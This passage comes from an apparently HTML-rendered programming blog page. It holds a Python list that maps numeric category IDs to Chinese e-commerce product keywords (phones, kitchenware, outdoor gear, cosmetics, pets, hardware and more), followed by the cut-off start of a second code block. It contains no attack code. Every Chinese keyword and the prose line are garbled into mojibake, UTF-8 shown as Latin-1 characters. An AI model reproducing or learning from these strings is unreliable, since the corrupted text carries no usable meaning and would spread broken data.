class="hljs-string">&#x27;å©´å„¿ç›‘æŠ¤å™¨&#x27;</span>]),<br><br>    (<span class="hljs-number">1</span>, [<span class="hljs-string">&#x27;æ‰‹æœº&#x27;</span>, <span class="hljs-string">&#x27;5G&#x27;</span>, <span class="hljs-string">&#x27;æ™ºèƒ½æœº&#x27;</span>, <span class="hljs-string">&#x27;æ›²é¢å±&#x27;</span>, <span class="hljs-string">&#x27;éªé¾™&#x27;</span>, <span class="hljs-string">&#x27;å…¨é¢å±&#x27;</span>, <span class="hljs-string">&#x27;å¿«å……&#x27;</span>, <span class="hljs-string">&#x27;åŒå¡åŒå¾…&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆæ‰‹æœº&#x27;</span>,<br>         <span class="hljs-string">&#x27;æ‹ç…§æ‰‹æœº&#x27;</span>, <span class="hljs-string">&#x27;é˜²æ°´æ‰‹æœº&#x27;</span>, <span class="hljs-string">&#x27;æŠ˜å å±&#x27;</span>, <span class="hljs-string">&#x27;AMOLED&#x27;</span>, <span class="hljs-string">&#x27;å±ä¸‹æŒ‡çº¹&#x27;</span>, <span class="hljs-string">&#x27;æ¶²å†·æ•£çƒ­&#x27;</span>, <span class="hljs-string">&#x27;è¶…çº§å¿«å……&#x27;</span>,<br>         <span class="hljs-string">&#x27;å‡é™æ‘„åƒå¤´&#x27;</span>, <span class="hljs-string">&#x27;HiFiéŸ³è´¨&#x27;</span>, <span class="hljs-string">&#x27;NFCåŠŸèƒ½&#x27;</span>, <span class="hljs-string">&#x27;æ— çº¿å……ç”µ&#x27;</span>, <span class="hljs-string">&#x27;ç§»åŠ¨ç”µæº&#x27;</span>, <span class="hljs-string">&#x27;æ‰‹æœºå£³&#x27;</span>]),<br><br>    (<span class="hljs-number">6</span>, [<span class="hljs-string">&#x27;å¨æˆ¿&#x27;</span>, <span class="hljs-string">&#x27;ç‚’é”…&#x27;</span>, <span class="hljs-string">&#x27;èœåˆ€&#x27;</span>, <span class="hljs-string">&#x27;ç §æ¿&#x27;</span>, <span class="hljs-string">&#x27;æ´—ç¢—æœº&#x27;</span>, <span class="hljs-string">&#x27;ç”µé¥­ç…²&#x27;</span>, <span class="hljs-string">&#x27;å¾®æ³¢ç‚‰&#x27;</span>, <span class="hljs-string">&#x27;å‹åŠ›é”…&#x27;</span>, <span class="hljs-string">&#x27;æ¦¨æ±æœº&#x27;</span>,<br>         <span class="hljs-string">&#x27;ç©ºæ°”ç‚¸é”…&#x27;</span>, <span class="hljs-string">&#x27;æ–™ç†æœº&#x27;</span>, <span class="hljs-string">&#x27;ç ´å£æœº&#x27;</span>, <span class="hljs-string">&#x27;è’¸çƒ¤ç®±&#x27;</span>, <span class="hljs-string">&#x27;æ²¹çƒŸæœº&#x27;</span>, <span class="hljs-string">&#x27;ç‡ƒæ°”ç¶&#x27;</span>, <span class="hljs-string">&#x27;æ¶ˆæ¯’æŸœ&#x27;</span>, <span class="hljs-string">&#x27;ç»è‚‰æœº&#x27;</span>,<br>         <span class="hljs-string">&#x27;çƒ˜ç„™æ¨¡å…·&#x27;</span>, <span class="hljs-string">&#x27;å¨æˆ¿ç§¤&#x27;</span>, <span class="hljs-string">&#x27;ç£¨åˆ€å™¨&#x27;</span>, <span class="hljs-string">&#x27;æ²¥æ°´ç¯®&#x27;</span>, <span class="hljs-string">&#x27;ä¿é²œç›’&#x27;</span>, <span class="hljs-string">&#x27;å¨æˆ¿ç½®ç‰©æ¶&#x27;</span>]),<br><br>    (<span class="hljs-number">20</span>, [<span class="hljs-string">&#x27;æˆ·å¤–&#x27;</span>, <span class="hljs-string">&#x27;å¸ç¯·&#x27;</span>, <span class="hljs-string">&#x27;ç™»å±±æ–&#x27;</span>, <span class="hljs-string">&#x27;ç¡è¢‹&#x27;</span>, <span class="hljs-string">&#x27;å†²é”‹è¡£&#x27;</span>, <span class="hljs-string">&#x27;ç™»å±±é‹&#x27;</span>, <span class="hljs-string">&#x27;æˆ·å¤–èƒŒåŒ…&#x27;</span>, <span class="hljs-string">&#x27;é‡é¤å«&#x27;</span>,<br>          <span class="hljs-string">&#x27;çƒ§çƒ¤æ¶&#x27;</span>, <span class="hljs-string">&#x27;éœ²è¥ç¯&#x27;</span>, <span class="hljs-string">&#x27;æŒ‡å—é’ˆ&#x27;</span>, <span class="hljs-string">&#x27;æ±‚ç”Ÿå“¨&#x27;</span>, <span class="hljs-string">&#x27;å†›åˆ€å¡&#x27;</span>, <span class="hljs-string">&#x27;é€Ÿå¹²è¡£&#x27;</span>, <span class="hljs-string">&#x27;æŠ“ç»’è¡£&#x27;</span>, <span class="hljs-string">&#x27;æ”€å²©ç»³&#x27;</span>,<br>          <span class="hljs-string">&#x27;å†°çˆª&#x27;</span>, <span class="hljs-string">&#x27;æ»‘é›ªæ¿&#x27;</span>, <span class="hljs-string">&#x27;é’“é±¼ç«¿&#x27;</span>, <span class="hljs-string">&#x27;æµ®æ½œé¢é•œ&#x27;</span>, <span class="hljs-string">&#x27;ç™»å±±æ‰£&#x27;</span>, <span class="hljs-string">&#x27;å¤´ç¯&#x27;</span>, <span class="hljs-string">&#x27;æˆ·å¤–æ°´å£¶&#x27;</span>]),<br><br>    (<span class="hljs-number">10</span>, [<span class="hljs-string">&#x27;è¿åŠ¨&#x27;</span>, <span class="hljs-string">&#x27;è·‘æ­¥æœº&#x27;</span>, <span class="hljs-string">&#x27;ç‘œä¼½å«&#x27;</span>, <span class="hljs-string">&#x27;å“‘é“ƒ&#x27;</span>, <span class="hljs-string">&#x27;æ³³é•œ&#x27;</span>, <span class="hljs-string">&#x27;å¥èº«è½¦&#x27;</span>, <span class="hljs-string">&#x27;æ¤­åœ†æœº&#x27;</span>, <span class="hljs-string">&#x27;ä»°å§æ¿&#x27;</span>,<br>          <span class="hljs-string">&#x27;è¿åŠ¨æŠ¤å…·&#x27;</span>, <span class="hljs-string">&#x27;æ‹‰åŠ›å™¨&#x27;</span>, <span class="hljs-string">&#x27;è·³ç»³&#x27;</span>, <span class="hljs-string">&#x27;ç¾½æ¯›çƒæ‹&#x27;</span>, <span class="hljs-string">&#x27;ä¹’ä¹“çƒæ¡Œ&#x27;</span>, <span class="hljs-string">&#x27;è¶³çƒé‹&#x27;</span>, <span class="hljs-string">&#x27;ç¯®çƒæ¶&#x27;</span>,<br>          <span class="hljs-string">&#x27;è¿åŠ¨æ‰‹ç¯&#x27;</span>, <span class="hljs-string">&#x27;è®¡æ­¥å™¨&#x27;</span>, <span class="hljs-string">&#x27;ç­‹è†œæª&#x27;</span>, <span class="hljs-string">&#x27;è¿åŠ¨æ°´å£¶&#x27;</span>, <span class="hljs-string">&#x27;è¿åŠ¨æ¯›å·¾&#x27;</span>, <span class="hljs-string">&#x27;è¿åŠ¨èƒŒåŒ…&#x27;</span>]),<br><br>    (<span class="hljs-number">21</span>, [<span class="hljs-string">&#x27;ç å®&#x27;</span>, <span class="hljs-string">&#x27;é’»çŸ³&#x27;</span>, <span class="hljs-string">&#x27;é»„é‡‘&#x27;</span>, <span class="hljs-string">&#x27;ç¿¡ç¿ &#x27;</span>, <span class="hljs-string">&#x27;é“‚é‡‘&#x27;</span>, <span class="hljs-string">&#x27;Ké‡‘&#x27;</span>, <span class="hljs-string">&#x27;çç &#x27;</span>, <span class="hljs-string">&#x27;å’Œç”°ç‰&#x27;</span>, <span class="hljs-string">&#x27;ç¥ç€&#x27;</span>,<br>          <span class="hljs-string">&#x27;èœœèœ¡&#x27;</span>, <span class="hljs-string">&#x27;çŠç‘š&#x27;</span>, <span class="hljs-string">&#x27;ç»¿æ¾çŸ³&#x27;</span>, <span class="hljs-string">&#x27;çº¢å®çŸ³&#x27;</span>, <span class="hljs-string">&#x27;è“å®çŸ³&#x27;</span>, <span class="hljs-string">&#x27;ç¥–æ¯ç»¿&#x27;</span>, <span class="hljs-string">&#x27;å©šæˆ’&#x27;</span>, <span class="hljs-string">&#x27;åŠå &#x27;</span>,<br>          <span class="hljs-string">&#x27;æ‰‹é“¾&#x27;</span>, <span class="hljs-string">&#x27;è€³ç¯&#x27;</span>, <span class="hljs-string">&#x27;èƒ¸é’ˆ&#x27;</span>, <span class="hljs-string">&#x27;è½¬è¿ç &#x27;</span>, <span class="hljs-string">&#x27;ç”Ÿè‚–æŒ‚ä»¶&#x27;</span>, <span class="hljs-string">&#x27;æ–‡ç©æ ¸æ¡ƒ&#x27;</span>]),<br><br>    (<span class="hljs-number">14</span>, [<span class="hljs-string">&#x27;é…’æ°´&#x27;</span>, <span class="hljs-string">&#x27;çº¢é…’&#x27;</span>, <span class="hljs-string">&#x27;ç™½é…’&#x27;</span>, <span class="hljs-string">&#x27;å¨å£«å¿Œ&#x27;</span>, <span class="hljs-string">&#x27;å•¤é…’&#x27;</span>, <span class="hljs-string">&#x27;é»„é…’&#x27;</span>, <span class="hljs-string">&#x27;æ¸…é…’&#x27;</span>, <span class="hljs-string">&#x27;ä¼ç‰¹åŠ &#x27;</span>, <span class="hljs-string">&#x27;æœ—å§†é…’&#x27;</span>,<br>          <span class="hljs-string">&#x27;é¸¡å°¾é…’&#x27;</span>, <span class="hljs-string">&#x27;èµ·æ³¡é…’&#x27;</span>, <span class="hljs-string">&#x27;é¦™æ§Ÿ&#x27;</span>, <span class="hljs-string">&#x27;ç²¾é…¿å•¤é…’&#x27;</span>, <span class="hljs-string">&#x27;æœé…’&#x27;</span>, <span class="hljs-string">&#x27;ä¿å¥é…’&#x27;</span>, <span class="hljs-string">&#x27;é…’å…·&#x27;</span>, <span class="hljs-string">&#x27;é†’é…’å™¨&#x27;</span>,<br>          <span class="hljs-string">&#x27;çº¢é…’æ¯&#x27;</span>, <span class="hljs-string">&#x27;é…’æŸœ&#x27;</span>, <span class="hljs-string">&#x27;é…’çª–&#x27;</span>, <span class="hljs-string">&#x27;å¹´ä»½é…’&#x27;</span>, <span class="hljs-string">&#x27;åŸæµ†é…’&#x27;</span>]),<br><br>    (<span class="hljs-number">5</span>, [<span class="hljs-string">&#x27;è”¬èœ&#x27;</span>, <span class="hljs-string">&#x27;æœ‰æœº&#x27;</span>, <span class="hljs-string">&#x27;ç»¿å¶èœ&#x27;</span>, <span class="hljs-string">&#x27;è¥¿çº¢æŸ¿&#x27;</span>, <span class="hljs-string">&#x27;é»„ç“œ&#x27;</span>, <span class="hljs-string">&#x27;èƒ¡èåœ&#x27;</span>, <span class="hljs-string">&#x27;åœŸè±†&#x27;</span>, <span class="hljs-string">&#x27;è¾£æ¤’&#x27;</span>, <span class="hljs-string">&#x27;èŒ„å­&#x27;</span>,<br>         <span class="hljs-string">&#x27;è¥¿å…°èŠ±&#x27;</span>, <span class="hljs-string">&#x27;è èœ&#x27;</span>, <span class="hljs-string">&#x27;èŠ¹èœ&#x27;</span>, <span class="hljs-string">&#x27;è²è—•&#x27;</span>, <span class="hljs-string">&#x27;èŒè‡&#x27;</span>, <span class="hljs-string">&#x27;è±†è§’&#x27;</span>, <span class="hljs-string">&#x27;å—ç“œ&#x27;</span>, <span class="hljs-string">&#x27;å±±è¯&#x27;</span>, <span class="hljs-string">&#x27;èŠ¦ç¬‹&#x27;</span>,<br>         <span class="hljs-string">&#x27;ç§‹è‘µ&#x27;</span>, <span class="hljs-string">&#x27;å¨ƒå¨ƒèœ&#x27;</span>, <span class="hljs-string">&#x27;å†°è‰&#x27;</span>, <span class="hljs-string">&#x27;ç¾½è¡£ç”˜è“&#x27;</span>, <span class="hljs-string">&#x27;èŠ½è‹—èœ&#x27;</span>]),<br><br>    (<span class="hljs-number">8</span>, [<span class="hljs-string">&#x27;æ°´æœ&#x27;</span>, <span class="hljs-string">&#x27;è¿›å£&#x27;</span>, <span class="hljs-string">&#x27;æ¦´è²&#x27;</span>, <span class="hljs-string">&#x27;è½¦å˜å­&#x27;</span>, <span class="hljs-string">&#x27;è“è“&#x27;</span>, <span class="hljs-string">&#x27;è‰è“&#x27;</span>, <span class="hljs-string">&#x27;èŠ’æœ&#x27;</span>, <span class="hljs-string">&#x27;å¥‡å¼‚æœ&#x27;</span>, <span class="hljs-string">&#x27;å±±ç«¹&#x27;</span>,<br>         <span class="hljs-string">&#x27;è èèœœ&#x27;</span>, <span class="hljs-string">&#x27;ç‰›æ²¹æœ&#x27;</span>, <span class="hljs-string">&#x27;è²é›¾&#x27;</span>, <span class="hljs-string">&#x27;é‡Šè¿¦æœ&#x27;</span>, <span class="hljs-string">&#x27;ç«é¾™æœ&#x27;</span>, <span class="hljs-string">&#x27;æ¤°å­&#x27;</span>, <span class="hljs-string">&#x27;ç™¾é¦™æœ&#x27;</span>, <span class="hljs-string">&#x27;ç•ªçŸ³æ¦´&#x27;</span>,<br>         <span class="hljs-string">&#x27;æ¨æ¡ƒ&#x27;</span>, <span class="hljs-string">&#x27;æ‡æ·&#x27;</span>, <span class="hljs-string">&#x27;è¥¿æ¢…&#x27;</span>, <span class="hljs-string">&#x27;æ— èŠ±æœ&#x27;</span>, <span class="hljs-string">&#x27;äººå‚æœ&#x27;</span>]),<br><br>    (<span class="hljs-number">4</span>, [<span class="hljs-string">&#x27;ä¹¦ç±&#x27;</span>, <span class="hljs-string">&#x27;å°è¯´&#x27;</span>, <span class="hljs-string">&#x27;æ•™æ&#x27;</span>, <span class="hljs-string">&#x27;å„¿ç«¥è¯»ç‰©&#x27;</span>, <span class="hljs-string">&#x27;ç§‘æŠ€&#x27;</span>, <span class="hljs-string">&#x27;æ–‡å­¦&#x27;</span>, <span class="hljs-string">&#x27;å†å²&#x27;</span>, <span class="hljs-string">&#x27;å“²å­¦&#x27;</span>, <span class="hljs-string">&#x27;å¿ƒç†å­¦&#x27;</span>,<br>         <span class="hljs-string">&#x27;ç»æµå­¦&#x27;</span>, <span class="hljs-string">&#x27;è®¡ç®—æœº&#x27;</span>, <span class="hljs-string">&#x27;ç¼–ç¨‹&#x27;</span>, <span class="hljs-string">&#x27;åŒ»å­¦&#x27;</span>, <span class="hljs-string">&#x27;æ³•å¾‹&#x27;</span>, <span class="hljs-string">&#x27;å»ºç­‘&#x27;</span>, <span class="hljs-string">&#x27;è‰ºæœ¯&#x27;</span>, <span class="hljs-string">&#x27;æ‘„å½±&#x27;</span>, <span class="hljs-string">&#x27;æ—…æ¸¸æŒ‡å—&#x27;</span>,<br>         <span class="hljs-string">&#x27;å­—å¸–&#x27;</span>, <span class="hljs-string">&#x27;ç»˜æœ¬&#x27;</span>, <span class="hljs-string">&#x27;ç™¾ç§‘å…¨ä¹¦&#x27;</span>, <span class="hljs-string">&#x27;å­—å…¸&#x27;</span>, <span class="hljs-string">&#x27;è€ƒè¯•ç”¨ä¹¦&#x27;</span>]),<br><br>    (<span class="hljs-number">24</span>, [<span class="hljs-string">&#x27;æ¸¸æˆ&#x27;</span>, <span class="hljs-string">&#x27;PS5&#x27;</span>, <span class="hljs-string">&#x27;Switch&#x27;</span>, <span class="hljs-string">&#x27;Xbox&#x27;</span>, <span class="hljs-string">&#x27;æ‰‹æŸ„&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆå¡å¸¦&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆå…‰ç›˜&#x27;</span>, <span class="hljs-string">&#x27;ç”µç«æ¤…&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ¸¸æˆé¼ æ ‡&#x27;</span>, <span class="hljs-string">&#x27;æœºæ¢°é”®ç›˜&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆè€³æœº&#x27;</span>, <span class="hljs-string">&#x27;VRè®¾å¤‡&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆå‘¨è¾¹&#x27;</span>, <span class="hljs-string">&#x27;æ‰‹åŠ&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆç‚¹å¡&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ¸¸æˆåŠ é€Ÿå™¨&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆçš®è‚¤&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆè´¦å·&#x27;</span>, <span class="hljs-string">&#x27;MODå·¥å…·&#x27;</span>, <span class="hljs-string">&#x27;æ¸¸æˆæ”»ç•¥ä¹¦&#x27;</span>]),<br><br>    (<span class="hljs-number">12</span>, [<span class="hljs-string">&#x27;å½©å¦†&#x27;</span>, <span class="hljs-string">&#x27;å£çº¢&#x27;</span>, <span class="hljs-string">&#x27;ç²‰åº•&#x27;</span>, <span class="hljs-string">&#x27;çœ¼å½±&#x27;</span>, <span class="hljs-string">&#x27;çœ‰ç¬”&#x27;</span>, <span class="hljs-string">&#x27;è…®çº¢&#x27;</span>, <span class="hljs-string">&#x27;é®ç‘•&#x27;</span>, <span class="hljs-string">&#x27;åŒ–å¦†åˆ·&#x27;</span>, <span class="hljs-string">&#x27;ç¾å¦†è›‹&#x27;</span>,<br>          <span class="hljs-string">&#x27;å®šå¦†å–·é›¾&#x27;</span>, <span class="hljs-string">&#x27;ç«æ¯›è†&#x27;</span>, <span class="hljs-string">&#x27;çœ¼çº¿ç¬”&#x27;</span>, <span class="hljs-string">&#x27;ä¿®å®¹æ£’&#x27;</span>, <span class="hljs-string">&#x27;é«˜å…‰&#x27;</span>, <span class="hljs-string">&#x27;å¦†å‰ä¹³&#x27;</span>, <span class="hljs-string">&#x27;å¸å¦†æ°´&#x27;</span>, <span class="hljs-string">&#x27;ç¾ç³&#x27;</span>,<br>          <span class="hljs-string">&#x27;å‡ç«æ¯›&#x27;</span>, <span class="hljs-string">&#x27;ç¾ç”²è´´&#x27;</span>, <span class="hljs-string">&#x27;åŒ–å¦†é•œ&#x27;</span>, <span class="hljs-string">&#x27;ç¾å®¹å·¥å…·&#x27;</span>, <span class="hljs-string">&#x27;é¦™æ°´&#x27;</span>]),<br><br>    (<span class="hljs-number">17</span>, [<span class="hljs-string">&#x27;åºŠä¸Šç”¨å“&#x27;</span>, <span class="hljs-string">&#x27;å››ä»¶å¥—&#x27;</span>, <span class="hljs-string">&#x27;ç¾½ç»’è¢«&#x27;</span>, <span class="hljs-string">&#x27;æ•å¤´&#x27;</span>, <span class="hljs-string">&#x27;åºŠå«&#x27;</span>, <span class="hljs-string">&#x27;èš•ä¸è¢«&#x27;</span>, <span class="hljs-string">&#x27;ä¹³èƒ¶æ•&#x27;</span>, <span class="hljs-string">&#x27;å‡‰å¸­&#x27;</span>,<br>          <span class="hljs-string">&#x27;åºŠè¤¥&#x27;</span>, <span class="hljs-string">&#x27;åºŠç¬ &#x27;</span>, <span class="hljs-string">&#x27;è¢«å¥—&#x27;</span>, <span class="hljs-string">&#x27;æ•å¥—&#x27;</span>, <span class="hljs-string">&#x27;èšŠå¸&#x27;</span>, <span class="hljs-string">&#x27;ç”µçƒ­æ¯¯&#x27;</span>, <span class="hljs-string">&#x27;è®°å¿†æ£‰&#x27;</span>, <span class="hljs-string">&#x27;æ¦»æ¦»ç±³&#x27;</span>,<br>          <span class="hljs-string">&#x27;åºŠå¹”&#x27;</span>, <span class="hljs-string">&#x27;é å«&#x27;</span>, <span class="hljs-string">&#x27;æŠ±æ•&#x27;</span>, <span class="hljs-string">&#x27;åºŠå°¾å‡³&#x27;</span>, <span class="hljs-string">&#x27;å¸ƒè‰ºåºŠ&#x27;</span>]),<br><br>    (<span class="hljs-number">18</span>, [<span class="hljs-string">&#x27;æ´—æŠ¤&#x27;</span>, <span class="hljs-string">&#x27;æ´—å‘æ°´&#x27;</span>, <span class="hljs-string">&#x27;æ²æµ´éœ²&#x27;</span>, <span class="hljs-string">&#x27;ç‰™è†&#x27;</span>, <span class="hljs-string">&#x27;æ´—é¢å¥¶&#x27;</span>, <span class="hljs-string">&#x27;æŠ¤å‘ç´ &#x27;</span>, <span class="hljs-string">&#x27;èº«ä½“ä¹³&#x27;</span>, <span class="hljs-string">&#x27;æ´—æ‰‹æ¶²&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ´—è¡£æ¶²&#x27;</span>, <span class="hljs-string">&#x27;æŸ”é¡ºå‰‚&#x27;</span>, <span class="hljs-string">&#x27;æ¶ˆæ¯’æ¶²&#x27;</span>, <span class="hljs-string">&#x27;æ´å•çµ&#x27;</span>, <span class="hljs-string">&#x27;å¨æˆ¿æ¸…æ´å‰‚&#x27;</span>, <span class="hljs-string">&#x27;ç»ç’ƒæ°´&#x27;</span>, <span class="hljs-string">&#x27;é™¤éœ‰å‰‚&#x27;</span>,<br>          <span class="hljs-string">&#x27;ç©ºæ°”æ¸…æ–°å‰‚&#x27;</span>, <span class="hljs-string">&#x27;é¦™è–°&#x27;</span>, <span class="hljs-string">&#x27;é™¤è¨ä»ª&#x27;</span>, <span class="hljs-string">&#x27;æ´—è¡£å‡ç &#x27;</span>, <span class="hljs-string">&#x27;è¡£ç‰©é™¤èŒæ¶²&#x27;</span>]),<br><br>    (<span class="hljs-number">7</span>, [<span class="hljs-string">&#x27;åŠå…¬&#x27;</span>, <span class="hljs-string">&#x27;æ‰“å°æœº&#x27;</span>, <span class="hljs-string">&#x27;æŠ•å½±ä»ª&#x27;</span>, <span class="hljs-string">&#x27;å¤å°çº¸&#x27;</span>, <span class="hljs-string">&#x27;æ–‡ä»¶å¤¹&#x27;</span>, <span class="hljs-string">&#x27;è®¢ä¹¦æœº&#x27;</span>, <span class="hljs-string">&#x27;ç¢çº¸æœº&#x27;</span>, <span class="hljs-string">&#x27;è€ƒå‹¤æœº&#x27;</span>,<br>         <span class="hljs-string">&#x27;ç™½æ¿&#x27;</span>, <span class="hljs-string">&#x27;ä¼šè®®ç”µè¯&#x27;</span>, <span class="hljs-string">&#x27;æ–‡ä»¶æŸœ&#x27;</span>, <span class="hljs-string">&#x27;ä¿é™©ç®±&#x27;</span>, <span class="hljs-string">&#x27;è£…è®¢æœº&#x27;</span>, <span class="hljs-string">&#x27;æ ‡ç­¾æœº&#x27;</span>, <span class="hljs-string">&#x27;æ”¯ç¥¨æ‰“å°æœº&#x27;</span>,<br>         <span class="hljs-string">&#x27;æ‰«æä»ª&#x27;</span>, <span class="hljs-string">&#x27;æŒ‡çº¹æ‰“å¡æœº&#x27;</span>, <span class="hljs-string">&#x27;åŠå…¬æ²™å‘&#x27;</span>, <span class="hljs-string">&#x27;ä¼šè®®æ¡Œ&#x27;</span>, <span class="hljs-string">&#x27;åŠå…¬éš”æ–­&#x27;</span>]),<br><br>    (<span class="hljs-number">3</span>, [<span class="hljs-string">&#x27;å®¶å±…&#x27;</span>, <span class="hljs-string">&#x27;æ²™å‘&#x27;</span>, <span class="hljs-string">&#x27;èŒ¶å‡ &#x27;</span>, <span class="hljs-string">&#x27;çª—å¸˜&#x27;</span>, <span class="hljs-string">&#x27;åœ°æ¯¯&#x27;</span>, <span class="hljs-string">&#x27;è¡£æŸœ&#x27;</span>, <span class="hljs-string">&#x27;é¤æ¡Œ&#x27;</span>, <span class="hljs-string">&#x27;ç”µè§†æŸœ&#x27;</span>, <span class="hljs-string">&#x27;é‹æŸœ&#x27;</span>,<br>         <span class="hljs-string">&#x27;ç½®ç‰©æ¶&#x27;</span>, <span class="hljs-string">&#x27;è£…é¥°ç”»&#x27;</span>, <span class="hljs-string">&#x27;èŠ±ç“¶&#x27;</span>, <span class="hljs-string">&#x27;å£çº¸&#x27;</span>, <span class="hljs-string">&#x27;ç¯å…·&#x27;</span>, <span class="hljs-string">&#x27;æ™ºèƒ½é—¨é”&#x27;</span>, <span class="hljs-string">&#x27;æ™¾è¡£æ¶&#x27;</span>, <span class="hljs-string">&#x27;æ”¶çº³ç›’&#x27;</span>,<br>         <span class="hljs-string">&#x27;å¢™è´´&#x27;</span>, <span class="hljs-string">&#x27;é—¨å«&#x27;</span>, <span class="hljs-string">&#x27;å®¶å±…æ‘†ä»¶&#x27;</span>, <span class="hljs-string">&#x27;é¦™ç‚‰&#x27;</span>]),<br><br>    (<span class="hljs-number">9</span>, [<span class="hljs-string">&#x27;å® ç‰©&#x27;</span>, <span class="hljs-string">&#x27;çŒ«ç²®&#x27;</span>, <span class="hljs-string">&#x27;ç‹—ç²®&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©çª&#x27;</span>, <span class="hljs-string">&#x27;ç‰µå¼•ç»³&#x27;</span>, <span class="hljs-string">&#x27;çŒ«ç ‚&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©ç©å…·&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©è¡£æœ&#x27;</span>,<br>         <span class="hljs-string">&#x27;å® ç‰©æµ´æ¶²&#x27;</span>, <span class="hljs-string">&#x27;é©±è™«è¯&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©ç¬¼&#x27;</span>, <span class="hljs-string">&#x27;é£Ÿç›†&#x27;</span>, <span class="hljs-string">&#x27;è‡ªåŠ¨å–‚é£Ÿå™¨&#x27;</span>, <span class="hljs-string">&#x27;çŒ«æŠ“æ¿&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©æ¨è½¦&#x27;</span>,<br>         <span class="hljs-string">&#x27;å® ç‰©èƒŒåŒ…&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©ç¾å®¹&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©åŒ»é™¢&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©æ®¡è‘¬&#x27;</span>, <span class="hljs-string">&#x27;å® ç‰©èŠ¯ç‰‡&#x27;</span>]),<br><br>    (<span class="hljs-number">13</span>, [<span class="hljs-string">&#x27;ä¿å¥&#x27;</span>, <span class="hljs-string">&#x27;é±¼æ²¹&#x27;</span>, <span class="hljs-string">&#x27;ç»´ç”Ÿç´ &#x27;</span>, <span class="hljs-string">&#x27;é’™ç‰‡&#x27;</span>, <span class="hljs-string">&#x27;è›‹ç™½ç²‰&#x27;</span>, <span class="hljs-string">&#x27;ç›Šç”ŸèŒ&#x27;</span>, <span class="hljs-string">&#x27;è¤ªé»‘ç´ &#x27;</span>, <span class="hljs-string">&#x27;æŠ¤è‚ç‰‡&#x27;</span>,<br>          <span class="hljs-string">&#x27;èƒ¶åŸè›‹ç™½&#x27;</span>, <span class="hljs-string">&#x27;è‘¡è„ç±½&#x27;</span>, <span class="hljs-string">&#x27;è¾…é…¶Q10&#x27;</span>, <span class="hljs-string">&#x27;æ°¨ç³–&#x27;</span>, <span class="hljs-string">&#x27;è†³é£Ÿçº¤ç»´&#x27;</span>, <span class="hljs-string">&#x27;èœ‚èƒ¶&#x27;</span>, <span class="hljs-string">&#x27;å†¬è™«å¤è‰&#x27;</span>,<br>          <span class="hljs-string">&#x27;é˜¿èƒ¶&#x27;</span>, <span class="hljs-string">&#x27;ç‡•çª&#x27;</span>, <span class="hljs-string">&#x27;äººå‚&#x27;</span>, <span class="hljs-string">&#x27;çµèŠå­¢å­ç²‰&#x27;</span>, <span class="hljs-string">&#x27;æŒ‰æ‘©å™¨&#x27;</span>, <span class="hljs-string">&#x27;è¶³æµ´ç›†&#x27;</span>]),<br><br>    (<span class="hljs-number">19</span>, [<span class="hljs-string">&#x27;äº”é‡‘&#x27;</span>, <span class="hljs-string">&#x27;èºä¸åˆ€&#x27;</span>, <span class="hljs-string">&#x27;ç”µé’»&#x27;</span>, <span class="hljs-string">&#x27;æ‰³æ‰‹&#x27;</span>, <span class="hljs-string">&#x27;å·¥å…·ç®±&#x27;</span>, <span class="hljs-string">&#x27;è§’ç£¨æœº&#x27;</span>, <span class="hljs-string">&#x27;ç”µé”¤&#x27;</span>, <span class="hljs-string">&#x27;åˆ‡å‰²æœº&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ°´å¹³ä»ª&#x27;</span>, <span class="hljs-string">&#x27;å·å°º&#x27;</span>, <span class="hljs-string">&#x27;é’³å­&#x27;</span>, <span class="hljs-string">&#x27;ç„Šæª&#x27;</span>, <span class="hljs-string">&#x27;ç ‚è½®æœº&#x27;</span>, <span class="hljs-string">&#x27;å†²å‡»é’»&#x27;</span>, <span class="hljs-string">&#x27;ç”µåŠ¨èºä¸åˆ€&#x27;</span>, <span class="hljs-string">&#x27;å¼€å­”å™¨&#x27;</span>,<br>          <span class="hljs-string">&#x27;æ°´ç®¡é…ä»¶&#x27;</span>, <span class="hljs-string">&#x27;é˜€é—¨&#x27;</span>, <span class="hljs-string">&#x27;å¯†å°èƒ¶&#x27;</span>, <span class="hljs-string">&#x27;è†¨èƒ€èºæ “&#x27;</span>, <span class="hljs-string">&#x27;ç»ç¼˜èƒ¶å¸¦&#x27;</span>]),<br>]<br></code></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®è¿™äº›åˆ†ç±»å’Œå…³é”®è¯é‡æ–°å¾—åˆ°ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 